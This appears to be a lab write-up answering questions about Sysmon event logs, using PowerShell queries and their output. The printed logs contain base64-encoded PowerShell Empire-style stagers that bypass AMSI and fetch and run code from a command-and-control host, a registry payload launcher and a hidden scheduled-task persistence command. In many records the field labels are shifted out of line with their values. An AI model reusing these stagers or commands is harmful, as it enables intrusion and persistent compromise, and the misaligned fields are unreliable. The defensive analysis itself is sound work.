               ApAC4AUwBlAFQAVgBhAGwAdQBFACgAJABuAFUATABMACwAKABOAGUAVwAtAE8AQgBKAEUAQwB0ACAAQwBPAGwAbABFAEMAdABpAG8Abg
               BTAC4ARwBlAE4AZQBSAGkAYwAuAEgAQQBTAEgAUwBFAHQAWwBzAFQAcgBpAE4AZwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQ
               BCAEwAeQAuAEcARQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQ
               BvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAHQARgBpAEUAbABkACgAJwBhAG0Acw
               BpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEATA
               BVAEUAKAAkAE4AdQBMAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAE0ALgBOAGUAdAAuAFMAZQBSAHYASQBjAEUAUA
               BPAEkAbgBUAE0AYQBOAEEAZwBlAHIAXQA6ADoARQBYAFAAZQBDAHQAMQAwADAAQwBvAE4AVABpAE4AdQBFAD0AMAA7ACQAdwBjAD0ATg
               BFAHcALQBPAEIASgBlAGMAVAAgAFMAeQBTAHQARQBNAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQ
               BsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdA
               AvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAEQARQByAFMALg
               BBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAUgBvAFgAWQA9AFsAUwBZAFMAVABlAE0ALg
               BOAEUAVAAuAFcAZQBiAFIARQBxAFUAZQBTAHQAXQA6ADoARABFAGYAQQBVAEwAVABXAEUAYgBQAFIAbwB4AHkAOwAkAFcAYwAuAFAAUg
               BPAHgAWQAuAEMAUgBlAGQARQBOAHQASQBhAGwAcwAgAD0AIABbAFMAeQBTAHQAZQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgBUAGkAQQ
               BMAEMAYQBDAGgAZQBdADoAOgBEAEUAZgBBAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUAZABFAG4AdABpAEEAbABTADsAJABTAGMAcg
               BpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAG0ALgBUAEUAWAB0AC4ARQ
               BOAGMATwBkAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAWQB0AGUAcwAoACcANQA0ADEANgBkADcAYwBkADYAZQBmADEAOQ
               A1AGEAMABmADcANgAyADIAYQA5AGMANQA2AGIANQA1AGUAOAA0ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJA
               BTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJA
               BLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJA
               BfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMg
               A1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAHIAJA
               BTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AZQ
               BtAHAAaQByAGUAYwAyADoAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAGMALgBIAGUAYQ
               BkAGUAUgBzAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBSAHoAcQAvADQAZABiAFAANgBZAFIAUA
               BZAHUASABCAHYAZABkAFQAQQAyAFQAWABVAHQAbwA9ACIAKQA7ACQARABBAFQAQQA9ACQAVwBDAC4ARABPAHcATgBsAE8AQQBkAEQAQQ
               BUAEEAKAAkAFMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQARABhAFQAQQBbADAALgAuADMAXQA7ACQAZABhAFQAQQA9ACQAZABBAFQAYQ
               BbADQALgAuACQARABBAHQAQQAuAEwAZQBOAGcAdABoAF0AOwAtAEoATwBJAG4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQAZA
               BhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
               Details: %8
```

Where in the registry was the payload stored in Investigation 3.1?
`HKLM\SOFTWARE\Microsoft\Network\debug`

What PowerShell launch code was used to launch the payload in Investigation 3.1?
`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp               HKLM:Software\Microsoft\Network debug).debug);start -Win Hidden -A \"-enc $x\" powershell";exit;`

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2.evtx -FilterXPath '*/System/EventID=3' | fl


TimeCreated  : 2/5/2018 7:08:55 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-05 07:08:53.923
               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
               ProcessGuid: 11020
               ProcessId: 0
               Image: DESKTOP-O153T4R\q
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.168.103.167
               SourceIp: DESKTOP-O153T4R.SSG-350M
               SourceHostname: 52984
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.168.103.188
               DestinationIp: ACA867BC.ipt.aol.com
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/5/2018 7:08:55 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-05 07:08:53.650
               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
               ProcessGuid: 11020
               ProcessId: 0
               Image: DESKTOP-O153T4R\q
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.168.103.167
               SourceIp: DESKTOP-O153T4R.SSG-350M
               SourceHostname: 52983
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.168.103.188
               DestinationIp: ACA867BC.ipt.aol.com
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/5/2018 7:08:50 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-05 07:08:48.634
               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
               ProcessGuid: 11020
               ProcessId: 0
               Image: DESKTOP-O153T4R\q
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.168.103.167
               SourceIp: DESKTOP-O153T4R.SSG-350M
               SourceHostname: 52982
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.168.103.188
               DestinationIp: ACA867BC.ipt.aol.com
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/5/2018 7:08:45 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-05 07:08:43.588
               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
               ProcessGuid: 11020
               ProcessId: 0
               Image: DESKTOP-O153T4R\q
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.168.103.167
               SourceIp: DESKTOP-O153T4R.SSG-350M
               SourceHostname: 52981
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.168.103.188
               DestinationIp: ACA867BC.ipt.aol.com
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/5/2018 7:08:40 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-05 07:08:38.572
               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
               ProcessGuid: 11020
               ProcessId: 0
               Image: DESKTOP-O153T4R\q
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.168.103.167
               SourceIp: DESKTOP-O153T4R.SSG-350M
               SourceHostname: 52980
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.168.103.188
               DestinationIp: ACA867BC.ipt.aol.com
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18
```
What is the IP of the adversary in Investigation 3.2?
*172.168.103.188*

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2.evtx -FilterXPath '*/System/EventID=1 and */EventData/Data[@Name="Image"]="C:\Windows\System32\cmd.exe"' | fl


TimeCreated  : 2/5/2018 7:08:53 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName: 2018-02-05 07:08:53.715
               UtcTime: {b231f4ab-0305-5a78-0000-0010c8256402}
               ProcessGuid: 4804
               ProcessId: 0
               Image: 10.0.16299.15 (WinBuild.160101.0800)
               FileVersion: Windows Command Processor
               Description: Microsoft® Windows® Operating System
               Product: Microsoft Corporation
               Company: "C:\WINDOWS\system32\cmd.exe" /C "echo SQBmACgAJABQAFMAVgBFAFIAUwBpAG8ATgBUAEEAQgBMAEUALgBQAFMA
               VgBFAFIAcwBpAG8AbgAuAE0AYQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAUwBzAEUAbQBCAEwA
               WQAuAEcAZQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4A
               LgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkA
               UwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAA
               RgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEAbABVAGUAKAAkAE4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMA
               YwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsA
               JwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcA
               ZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsA
               JwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAA
               fQAkAHYAYQBsAD0AWwBDAE8AbABMAEUAYwBUAGkAbwBuAFMALgBHAEUAbgBFAHIAaQBjAC4ARABpAEMAdABpAG8AbgBBAHIAWQBbAFMA
               VABSAEkAbgBnACwAUwB5AHMAdABlAG0ALgBPAEIAagBFAEMAVABdAF0AOgA6AG4AZQBXACgAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcA
               RQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAGwALgBBAGQA
               ZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwA
               MAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8A
               bABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIA
               aQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEATAB9AEUAbABzAEUAewBbAFMAQwByAEkAUABUAEIA
               bABvAEMAawBdAC4AIgBHAEUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAA
               dQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAEwAVQBlACgAJABOAFUAbABMACwAKABOAEUAVwAtAE8AQgBqAEUA
               QwBUACAAQwBPAEwAbABFAGMAVABJAG8ATgBzAC4ARwBFAE4AZQBSAEkAYwAuAEgAYQBTAEgAUwBlAHQAWwBTAHQAUgBJAG4AZwBdACkA
               KQB9AFsAUgBFAGYAXQAuAEEAcwBTAGUAbQBiAEwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUA
               bQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4A
               RwBlAHQARgBJAEUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQA
               YQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAG4AVQBsAEwALAAkAHQAcgB1AEUAKQB9ADsAfQA7AFsAUwBZAHMAdABFAG0A
               LgBOAEUAVAAuAFMAZQBSAHYASQBDAEUAUABPAEkAbgBUAE0AQQBOAEEARwBlAFIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBvAG4A
               dABpAE4AVQBlAD0AMAA7ACQAVwBjAD0ATgBFAHcALQBPAGIASgBlAEMAVAAgAFMAWQBzAHQAZQBtAC4ATgBlAFQALgBXAEUAQgBDAGwA
               SQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcA
               TwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcA
               OwAkAHcAYwAuAEgAZQBhAEQARQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAA
               UgBPAHgAeQA9AFsAUwB5AFMAdABFAG0ALgBOAEUAdAAuAFcAZQBCAFIAZQBxAHUARQBzAFQAXQA6ADoARABFAEYAYQB1AEwAdABXAEUA
               QgBQAHIAbwB4AHkAOwAkAFcAYwAuAFAAUgBvAHgAeQAuAEMAUgBFAEQARQBOAHQASQBhAGwAUwAgAD0AIABbAFMAeQBTAHQARQBNAC4A
               TgBFAFQALgBDAFIARQBkAGUATgB0AEkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAEUARgBBAHUATAB0AE4AZQBUAFcATwByAGsAQwBSAEUA
               RABFAG4AdABJAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsA
               UwB5AFMAVABFAG0ALgBUAGUAWABUAC4ARQBuAGMAbwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAWQBUAGUAUwAoACcA
               NQA0ADEANgBkADcAYwBkADYAZQBmADEAOQA1AGEAMABmADcANgAyADIAYQA5AGMANQA2AGIANQA1AGUAOAA0ACcAKQA7ACQAUgA9AHsA
               JABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQA
               UwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoA
               XQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0A
               KAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMA
               WwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQA
               cwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYAOAAuADEAMAAzAC4AMQA4ADgAOgA4ADAAJwA7ACQAdAA9ACcALwBsAG8A
               ZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABFAEEARABlAHIAUwAuAEEARABkACgAIgBDAG8AbwBrAGkA
               ZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AegBnADcALwBJAGgATAB5AEYAQQBHAHgAUgB1AGkAdwBRADUAMgB3AHcAdAAzAG4ATgBxAHMA
               PQAiACkAOwAkAEQAYQBUAGEAPQAkAFcAQwAuAEQATwB3AE4AbABvAEEARABEAEEAdABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYA
               PQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAQQB0AEEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUAbgBHAHQA
               SABdADsALQBqAE8ASQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkA
               RQBYAA== > c:\users\q\AppData:blah.txt"
               OriginalFileName: C:\Users\q\
               CommandLine: DESKTOP-O153T4R\q
               CurrentDirectory: {b231f4ab-a303-5a66-0000-002087720500}
               User: 0x57287
               LogonGuid: 1
               LogonId: 0x0
               TerminalSessionId: 0
               IntegrityLevel: {b231f4ab-f2e9-5a77-0000-0010cb670802}
               Hashes: 11020
               ParentProcessGuid: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
               ParentProcessId: 0
               ParentImage: %21
               ParentCommandLine: %22
```

What is the full path of the payload location in Investigation 3.2?
`c:\users\q\AppData:blah.txt`

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2.evtx -FilterXPath '*/System/EventID=1 and */EventData/Data[@Name="Image"]="C:\Windows\System32\schtasks.exe"' | fl


TimeCreated  : 2/5/2018 7:08:53 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName: 2018-02-05 07:08:53.750
               UtcTime: {b231f4ab-0305-5a78-0000-00101b276402}
               ProcessGuid: 8992
               ProcessId: 0
               Image: 10.0.16299.15 (WinBuild.160101.0800)
               FileVersion: Task Scheduler Configuration Tool
               Description: Microsoft® Windows® Operating System
               Product: Microsoft Corporation
               Company: "C:\WINDOWS\system32\schtasks.exe" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR
               "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX
               ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c ''more <
               c:\users\q\AppData:blah.txt'''))))\""
               OriginalFileName: C:\Users\q\
               CommandLine: DESKTOP-O153T4R\q
               CurrentDirectory: {b231f4ab-a303-5a66-0000-002087720500}
               User: 0x57287
               LogonGuid: 1
               LogonId: 0x0
               TerminalSessionId: 0
               IntegrityLevel: {b231f4ab-f2e9-5a77-0000-0010cb670802}
               Hashes: 11020
               ParentProcessGuid: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
               ParentProcessId: 0
               ParentImage: %21
               ParentCommandLine: %22
```

What was the full command used to create the scheduled task in Investigation 3.2?
`"C:\WINDOWS\system32\schtasks.exe" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR               "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX               ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c ''more <c:\users\q\AppData:blah.txt'''))))\""`

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2.evtx -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="SourceImage"]="C:\Windows\System32\lsass.exe"' | fl


TimeCreated  : 2/5/2018 7:08:53 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 10
Message      : Process accessed:
               RuleName: 2018-02-05 07:08:53.766
               UtcTime: {b231f4ab-a2ef-5a66-0000-0010ec930000}
               SourceProcessGUID: 756
               SourceProcessId: 6404
               SourceThreadId: 0
               SourceImage: {b231f4ab-0305-5a78-0000-00101b276402}
               TargetProcessGUID: 8992
               TargetProcessId: 0
               TargetImage: 0x1478
               GrantedAccess: 0xC
               CallTrace: %11

TimeCreated  : 2/5/2018 7:08:53 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 10
Message      : Process accessed:
               RuleName: 2018-02-05 07:08:53.766
               UtcTime: {b231f4ab-a2ef-5a66-0000-0010ec930000}
               SourceProcessGUID: 756
               SourceProcessId: 6404
               SourceThreadId: 0
               SourceImage: {b231f4ab-0305-5a78-0000-00101b276402}
               TargetProcessGUID: 8992
               TargetProcessId: 0
               TargetImage: 0x1000
               GrantedAccess: 0xC
               CallTrace: %11
```

What process was accessed by schtasks.exe that would be considered suspicious behavior in Investigation 3.2?
*lsass.exe*

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-4.evtx -FilterXPath '*/System/EventID=3' | fl


TimeCreated  : 2/19/2018 5:14:25 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:58.725
               UtcTime: {b231f4ab-02e9-5a84-0000-0010586c0200}
               ProcessGuid: 4152
               ProcessId: 0
               Image: NT AUTHORITY\LOCAL SERVICE
               User: udp
               Protocol: false
               Initiated: false
               SourceIsIpv6: 239.255.255.250
               SourceIp:
               SourceHostname: 1900
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 127.0.0.1
               DestinationIp: DESKTOP-O153T4R
               DestinationHostname: 51228
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/19/2018 5:14:25 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:58.724
               UtcTime: {b231f4ab-02e9-5a84-0000-0010586c0200}
               ProcessGuid: 4152
               ProcessId: 0
               Image: NT AUTHORITY\LOCAL SERVICE
               User: udp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 127.0.0.1
               SourceIp: DESKTOP-O153T4R
               SourceHostname: 51228
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 239.255.255.250
               DestinationIp:
               DestinationHostname: 1900
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/19/2018 5:14:25 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:58.697
               UtcTime: {b231f4ab-02e7-5a84-0000-0010b2590100}
               ProcessGuid: 1776
               ProcessId: 0
               Image: NT AUTHORITY\LOCAL SERVICE
               User: udp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 68
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.16.199.254
               DestinationIp:
               DestinationHostname: 67
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:56 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:55.108
               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
               ProcessGuid: 7412
               ProcessId: 0
               Image: NT AUTHORITY\SYSTEM
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 49867
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:52 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:50.091
               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
               ProcessGuid: 7412
               ProcessId: 0
               Image: NT AUTHORITY\SYSTEM
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 49866
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:47 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:45.060
               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
               ProcessGuid: 7412
               ProcessId: 0
               Image: NT AUTHORITY\SYSTEM
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 49865
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:41 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:40.044
               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
               ProcessGuid: 7412
               ProcessId: 0
               Image: NT AUTHORITY\SYSTEM
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 49864
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:36 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:35.014
               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
               ProcessGuid: 7412
               ProcessId: 0
               Image: NT AUTHORITY\SYSTEM
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 49863
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:32 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:29.997
               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
               ProcessGuid: 7412
               ProcessId: 0
               Image: NT AUTHORITY\SYSTEM
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 49862
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/14/2018 9:51:26 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-14 09:51:24.967
               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
               ProcessGuid: 7412
               ProcessId: 0
               Image: NT AUTHORITY\SYSTEM
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 49861
               SourcePort: 0
               SourcePortName: false
